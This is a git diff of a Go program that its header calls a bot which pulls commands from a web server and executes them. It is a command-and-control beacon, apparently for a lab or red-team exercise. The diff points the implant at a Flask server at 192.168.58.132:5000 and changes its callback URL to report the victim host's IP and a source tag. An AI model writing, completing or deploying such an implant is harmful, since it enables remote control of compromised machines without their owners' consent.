@@ -1,5 +1,5 @@
 // Golang bot to pull commands from webserver and execute them
-// Disclaimer: This doesn't work
+// Disclaimer: This barely works
 // @author: degenerat3
 
 package main
@@ -11,12 +11,11 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
-	"strings"
 )
 
-var serv = "127.0.0.1:5000" //IP of flask serv
-var src = "GoBin"             // where is this calling back from
-var loopTime = 10           //sleep time in secs
+var serv = "192.168.58.132:5000" //IP of flask serv
+var src = "GoBin"                // where is this calling back from
+var loopTime = 10                //sleep time in secs
 
 // get hostname and return it as a string
 func getHn() string {
@@ -29,13 +28,12 @@ func getIP() string {
 	defer conn.Close()
 	ad := conn.LocalAddr().(*net.UDPAddr)
 	ipStr := ad.IP.String()
-	ipStr = strings.Replace(ipStr, ".", "-", 10)
 	return ipStr
 }
 
 func getCommands() {
 	ip := getIP()
-	url := "http://" + serv + "/api/callback/" + ip
+	url := "http://" + serv + "/api/callback/" + ip + "/" + src
 	r, err := http.Get(url)
 	if err != nil {
 		panic(err)
